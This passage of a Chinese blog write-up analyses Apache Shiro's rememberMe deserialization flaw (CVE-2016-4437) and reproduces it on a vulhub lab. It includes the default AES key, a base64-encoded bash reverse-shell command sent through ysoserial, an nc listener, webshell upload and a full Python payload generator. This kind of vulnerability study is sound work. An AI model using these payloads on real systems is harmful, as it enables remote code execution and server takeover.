WebUtils.getHttpResponse(subject);</span><br><span class="line">            forgetIdentity(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Removes the &#x27;rememberMe&#x27; cookie from the associated &#123;<span class="doctag">@link</span> WebSubjectContext&#125;&#x27;s request/response pair.</span></span><br><span class="line"><span class="comment">     * &lt;p/&gt;</span></span><br><span class="line"><span class="comment">     * The &#123;<span class="doctag">@code</span> SubjectContext&#125; instance is expected to be a &#123;<span class="doctag">@link</span> WebSubjectContext&#125; instance with an HTTP</span></span><br><span class="line"><span class="comment">     * Request/Response pair.  If it is not a &#123;<span class="doctag">@code</span> WebSubjectContext&#125; or that &#123;<span class="doctag">@code</span> WebSubjectContext&#125; does not</span></span><br><span class="line"><span class="comment">     * have an HTTP Request/Response pair, this implementation does nothing.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> subjectContext the contextual data, usually provided by a &#123;<span class="doctag">@link</span> Subject.Builder&#125; implementation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subjectContext);</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subjectContext);</span><br><span class="line">            forgetIdentity(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Removes the rememberMe cookie from the given request/response pair.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request  the incoming HTTP servlet request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response the outgoing HTTP servlet response</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        getCookie().removeFrom(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>通过 getCokie() 获取用户请求的 Cookie ，再执行 removeFrom 方法</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001202501429.png" data-caption="image-20221001202501429"><img src="/../images/shiro/image-20221001202501429.png" alt="image-20221001202501429"></a></p>
<p>继续跟进 removeFrom, 定位具体执行代码位置为 SimpleCookie.java</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001202758070.png" data-caption="image-20221001202758070"><img src="/../images/shiro/image-20221001202758070.png" alt="image-20221001202758070"></a></p>
<p>removeFrom 方法定义了一些方法体，并将值返回与 response 头部添加 Set-Cookie：rememberMe&#x3D;deleteMe</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001203541265.png" data-caption="image-20221001203541265"><img src="/../images/shiro/image-20221001203541265.png" alt="image-20221001203541265"></a></p>
<p>回到 onSuccessfulLogin 方法中，若设置了 rememberMe 则进入 rememberIdentity</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001204041201.png" data-caption="image-20221001204041201"><img src="/../images/shiro/image-20221001204041201.png" alt="image-20221001204041201"></a></p>
<p>跟进 rememberIdentity 方法，Ctrl + 鼠标左键，代码位置 AbstractRememberMeManager.java ,具体代码如下：</p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> &#123;</span><br><span class="line">     <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> getIdentityToRemember(subject, authcInfo);</span><br><span class="line">     rememberIdentity(subject, principals);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns &#123;<span class="doctag">@code</span> info&#125;.&#123;<span class="doctag">@link</span> org.apache.shiro.authc.AuthenticationInfo#getPrincipals() getPrincipals()&#125; and</span></span><br><span class="line"><span class="comment">  * ignores the &#123;<span class="doctag">@link</span> Subject&#125; argument.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> subject the subject for which the principals are being remembered.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> info    the authentication info resulting from the successful authentication attempt.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> the &#123;<span class="doctag">@code</span> PrincipalCollection&#125; to remember.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">protected</span> PrincipalCollection <span class="title function_">getIdentityToRemember</span><span class="params">(Subject subject, AuthenticationInfo info)</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> info.getPrincipals();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Remembers the specified account principals by first</span></span><br><span class="line"><span class="comment">  * &#123;<span class="doctag">@link</span> #convertPrincipalsToBytes(org.apache.shiro.subject.PrincipalCollection) converting&#125; them to a byte</span></span><br><span class="line"><span class="comment">  * array and then &#123;<span class="doctag">@link</span> #rememberSerializedIdentity(org.apache.shiro.subject.Subject, byte[]) remembers&#125; that</span></span><br><span class="line"><span class="comment">  * byte array.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> subject           the subject for which the principals are being remembered.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> accountPrincipals the principals to remember for retrieval later.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">     <span class="type">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">     rememberSerializedIdentity(subject, bytes);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts the given principal collection the byte array that will be persisted to be &#x27;remembered&#x27; later.</span></span><br><span class="line"><span class="comment">  * &lt;p/&gt;</span></span><br><span class="line"><span class="comment">  * This implementation first &#123;<span class="doctag">@link</span> #serialize(org.apache.shiro.subject.PrincipalCollection) serializes&#125; the</span></span><br><span class="line"><span class="comment">  * principals to a byte array and then &#123;<span class="doctag">@link</span> #encrypt(byte[]) encrypts&#125; that byte array.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> principals the &#123;<span class="doctag">@code</span> PrincipalCollection&#125; to convert to a byte array</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> the representative byte array to be persisted for remember me functionality.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">protected</span> <span class="type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">     <span class="type">byte</span>[] bytes = serialize(principals);</span><br><span class="line">     <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">         bytes = encrypt(bytes);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> bytes;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>



<p>由上代码可知，rememberIdentity 使用了 convertPrincipalsToBytes 对 accountPrincipals（用户名）进行了处理</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001204642446.png" data-caption="image-20221001204642446"><img src="/../images/shiro/image-20221001204642446.png" alt="image-20221001204642446"></a></p>
<p>进入 convertPrincipalsToBytes 后，使用 serialize 对 principals（用户名）进行处理，如果不为空则进行 encrypt 加密处理</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001204916754.png" data-caption="image-20221001204916754"><img src="/../images/shiro/image-20221001204916754.png" alt="image-20221001204916754"></a></p>
<p>跟进 serialize 方法，查看去具体实现代码</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001205605497.png" data-caption="image-20221001205605497"><img src="/../images/shiro/image-20221001205605497.png" alt="image-20221001205605497"></a></p>
<p>对 principals（用户名）利用 writeObject 方法进行序列化（该方法文章开头有说明）</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001205850975.png" data-caption="image-20221001205850975"><img src="/../images/shiro/image-20221001205850975.png" alt="image-20221001205850975"></a></p>
<p>现在知道了 AbstractRememberMeManager.java 中 convertPrincipalsToBytes 对用户名进行了序列化,同位置下，再查看其 bytes 加密方式，如果 getCipherService() 不为空则对 bytes进行加密</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002105038632.png" data-caption="image-20221002105038632"><img src="/../images/shiro/image-20221002105038632.png" alt="image-20221002105038632"></a></p>
<p>跟进 getCipherService()</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002105113490.png" data-caption="image-20221002105113490"><img src="/../images/shiro/image-20221002105113490.png" alt="image-20221002105113490"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002105212735.png" data-caption="image-20221002105212735"><img src="/../images/shiro/image-20221002105212735.png" alt="image-20221002105212735"></a></p>
<p>查看 cipherService 调用情况，全局搜索  this.cipherService</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002111915882.png" data-caption="image-20221002111915882"><img src="/../images/shiro/image-20221002111915882.png" alt="image-20221002111915882"></a></p>
<p>返回 convertPrincipalsToBytes 方法中跟进 bytes 中 encrypt 加密，Ctrl + 鼠标左键 进入，这里通过 cipherService.encrypt 传入序列化数据和 getEncryptionCipherKey()</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002110713564.png" data-caption="image-20221002110713564"><img src="/../images/shiro/image-20221002110713564.png" alt="image-20221002110713564"></a></p>
<p>跟进 getEncryptionCipherKey()，Ctrl + 鼠标左键，返回一个加密 Key</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002111026239.png" data-caption="image-20221002111026239"><img src="/../images/shiro/image-20221002111026239.png" alt="image-20221002111026239"></a></p>
<p>查看调用，全局搜索 this.encryptionCipherKry</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002111502727.png" data-caption="image-20221002111502727"><img src="/../images/shiro/image-20221002111502727.png" alt="image-20221002111502727"></a></p>
<p>这一步查看 cipherService 调用的时候，发现 setCipherKey 方法在构造方法里面被调用了。</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002112059260.png" data-caption="image-20221002112059260"><img src="/../images/shiro/image-20221002112059260.png" alt="image-20221002112059260"></a></p>
<p>查看 DEFAULT_CIPHER_KEY_BYTES , CTRL+鼠标左键进入，默认 Key 值为 kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002112234044.png" data-caption="image-20221002112234044"><img src="/../images/shiro/image-20221002112234044.png" alt="image-20221002112234044"></a></p>
<p>回到AbstractRememberMeManager.java的rememberIdentity方法中,在convertPrincipalsToBytes对用户名进行序列化后，进入到 rememberSerializedIdentity 方法对 subject、byte 进行处理</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002102940381.png" data-caption="image-20221002102940381"><img src="/../images/shiro/image-20221002102940381.png" alt="image-20221002102940381"></a></p>
<p>跟进 rememberSerializedIdentity ，具体实现代码位于 CookieRememberMeManager.java</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002103109939.png" data-caption="image-20221002103109939"><img src="/../images/shiro/image-20221002103109939.png" alt="image-20221002103109939"></a></p>
<p>对 Cookie 进行了 base64 加密处理，保存在 Cookie 中</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002103257797.png" data-caption="image-20221002103257797"><img src="/../images/shiro/image-20221002103257797.png" alt="image-20221002103257797"></a></p>
<p>至止，加密结束。</p>
<hr>
<h4 id="解密分析"><a href="#解密分析" class="headerlink" title="解密分析"></a>解密分析</h4><p>通过搜索分析解密，回溯上一层，直接选中 decrypt 鼠标右键 File Usages，定位代码，回溯上一层代码，代码为右下方 </p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003210457908.png" data-caption="image-20221003210457908"><img src="/../images/shiro/image-20221003210457908.png" alt="image-20221003210457908"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003210757811.png" data-caption="image-20221003210757811"><img src="/../images/shiro/image-20221003210757811.png" alt="image-20221003210757811"></a></p>
<p>继续回溯 convertBytesToPrincipals</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003210905788.png" data-caption="image-20221003210905788"><img src="/../images/shiro/image-20221003210905788.png" alt="image-20221003210905788"></a></p>
<p>全局搜索定位 getRememberedSerializedIdentity 方法具体代码</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003211707942.png" data-caption="image-20221003211707942"><img src="/../images/shiro/image-20221003211707942.png" alt="image-20221003211707942"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003211532163.png" data-caption="image-20221003211532163"><img src="/../images/shiro/image-20221003211532163.png" alt="image-20221003211532163"></a></p>
<p>解密后继续调用 convertBytesToPricipals 方法</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003211913642.png" data-caption="image-20221003211913642"><img src="/../images/shiro/image-20221003211913642.png" alt="image-20221003211913642"></a></p>
<p>继续跟进 convertBytesToPricipals 方法，CTRL + 鼠标左键进入</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003212030943.png" data-caption="image-20221003212030943"><img src="/../images/shiro/image-20221003212030943.png" alt="image-20221003212030943"></a></p>
<p>继续跟进 decrypt ，解密后得到的结果为序列化字符串的bytes，然后进入 deserialize</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003212136191.png" data-caption="image-20221003212136191"><img src="/../images/shiro/image-20221003212136191.png" alt="image-20221003212136191"></a></p>
<p>得到序列化数值后在进行反序列化操作</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003212959172.png" data-caption="image-20221003212959172"><img src="/../images/shiro/image-20221003212959172.png" alt="image-20221003212959172"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003213037441.png" data-caption="image-20221003213037441"><img src="/../images/shiro/image-20221003213037441.png" alt="image-20221003213037441"></a></p>
<hr>
<h2 id="五、漏洞复现"><a href="#五、漏洞复现" class="headerlink" title="五、漏洞复现"></a>五、漏洞复现</h2><h3 id="1、确认是否使用-Shiro-框架"><a href="#1、确认是否使用-Shiro-框架" class="headerlink" title="1、确认是否使用 Shiro 框架"></a>1、确认是否使用 Shiro 框架</h3><p>正常访问时</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003214114011.png" data-caption="image-20221003214114011"><img src="/../images/shiro/image-20221003214114011.png" alt="image-20221003214114011"></a></p>
<p>当我们在 Cookie 处添加 remember&#x3D;111 时，返回包出现 remember&#x3D;deleteMe 则证明网站使用 Shiro 框架</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003214254415.png" data-caption="image-20221003214254415"><img src="/../images/shiro/image-20221003214254415.png" alt="image-20221003214254415"></a></p>
<h3 id="2、漏洞探测"><a href="#2、漏洞探测" class="headerlink" title="2、漏洞探测"></a>2、<strong>漏洞探测</strong></h3><p>burp 插件探测，发现 key 即处在 key 泄露，可构造攻击</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003214813621.png" data-caption="image-20221003214813621"><img src="/../images/shiro/image-20221003214813621.png" alt="image-20221003214813621"></a></p>
<h3 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a><strong>3、漏洞利用</strong></h3><p>图形化利用工具，监测密钥</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003220946760.png" data-caption="image-20221003220946760"><img src="/../images/shiro/image-20221003220946760.png" alt="image-20221003220946760"></a></p>
<p>爆破利用链</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003221058326.png" data-caption="image-20221003221058326"><img src="/../images/shiro/image-20221003221058326.png" alt="image-20221003221058326"></a></p>
<p>命令执行</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003221158962.png" data-caption="image-20221003221158962"><img src="/../images/shiro/image-20221003221158962.png" alt="image-20221003221158962"></a></p>
<p>上传 webshell 自定义路径为当前网站根目录，获取 webshell</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003222145191.png" data-caption="image-20221003222145191"><img src="/../images/shiro/image-20221003222145191.png" alt="image-20221003222145191"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003222431550.png" data-caption="image-20221003222431550"><img src="/../images/shiro/image-20221003222431550.png" alt="image-20221003222431550"></a></p>
<h3 id="4、Linux-反弹shell"><a href="#4、Linux-反弹shell" class="headerlink" title="4、Linux 反弹shell"></a>4、Linux 反弹shell</h3><p>环境如下：</p>
<table>
<thead>
<tr>
<th>环境</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>靶机 IP</td>
<td>192.168.114.140</td>
</tr>
<tr>
<td>攻击机 IP</td>
<td>192.168.114.139</td>
</tr>
<tr>
<td>反弹shell vps</td>
<td>xxx.xxx.xxx.xxx</td>
</tr>
<tr>
<td>漏洞环境</td>
<td>vulhub shiro&#x2F;CVE-2016-4437</td>
</tr>
<tr>
<td>生成shiro 反序列化攻击 payload</td>
<td>expShiro.py</td>
</tr>
<tr>
<td>辅助工具</td>
<td>ysoserial-all.jar</td>
</tr>
</tbody></table>
<p>下载 vulhub ，进行 shiro 目录利用 docker 拉取 shiro 漏洞环境镜像</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015103652468-16658190654921.png" data-caption="image-20221015103652468"><img src="/../images/shiro/image-20221015103652468-16658190654921.png" alt="image-20221015103652468"></a></p>
<p>访问 8080 端口</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015103818676.png" data-caption="image-20221015103818676"><img src="/../images/shiro/image-20221015103818676.png" alt="image-20221015103818676"></a></p>
<p>服务器启监听，等待接收shell</p>
<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure></div>

<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015143616770.png" data-caption="image-20221015143616770"><img src="/../images/shiro/image-20221015143616770.png" alt="image-20221015143616770"></a></p>
<p>启用 ysoserial-all.jar 工具中的 JRMP 监听模块，监听 1999 端口并执行反弹 shell 命令</p>
<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1999 CommonsCollections5 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54LzIzMzMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure></div>

<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015143557298.png" data-caption="image-20221015143557298"><img src="/../images/shiro/image-20221015143557298.png" alt="image-20221015143557298"></a></p>
<p>expShiro.py 生成 payload，脚本如下：</p>
<div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-all.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>命令：python3 expShiro.py x.x.x.x:1999</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015143803339.png" data-caption="image-20221015143803339"><img src="/../images/shiro/image-20221015143803339.png" alt="image-20221015143803339"></a></p>
<p>将生成的 rememberMe 数据于 burp 放包执行获取反弹 shell</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015144055376-16658217756221.png" data-caption="image-20221015144055376"><img src="/../images/shiro/image-20221015144055376-16658217756221.png" alt="image-20221015144055376"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015144009953.png" data-caption="image-20221015144009953"><img src="/../images/shiro/image-20221015144009953.png" alt="image-20221015144009953"></a></p>
<h2 id="六、小结"><a href="#六、小结" class="headerlink" title="六、小结"></a>六、小结</h2><p>本文只作学习记录，文章中出现的环境及工具可在 Github 仓库 Download。</p>
<h2 id="七、参考文章"><a href="#七、参考文章" class="headerlink" title="七、参考文章"></a>七、参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.geekby.site/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/`</span><br><span class="line">http://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/</span><br><span class="line">https://blog.csdn.net/qq_44769520/article/details/123476443</span><br><span class="line">https://cloud.tencent.com/developer/article/1590955</span><br><span class="line">https://www.freebuf.com/vuls/290922.html</span><br></pre></td></tr></table></figure></div>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Java-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">二、Java 序列化与反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">三、漏洞环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">四、漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">1、漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">2、代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90"><span class="toc-number">4.2.1.</span> <span class="toc-text">加密分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90"><span class="toc-number">4.2.2.</span> <span class="toc-text">解密分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.</span> <span class="toc-text">五、漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E7%A1%AE%E8%AE%A4%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8-Shiro-%E6%A1%86%E6%9E%B6"><span class="toc-number">5.1.</span> <span class="toc-text">1、确认是否使用 Shiro 框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">5.2.</span> <span class="toc-text">2、漏洞探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.3.</span> <span class="toc-text">3、漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81Linux-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.4.</span> <span class="toc-text">4、Linux 反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%B0%8F%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">六、小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">7.</span> <span class="toc-text">七、参考文章</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
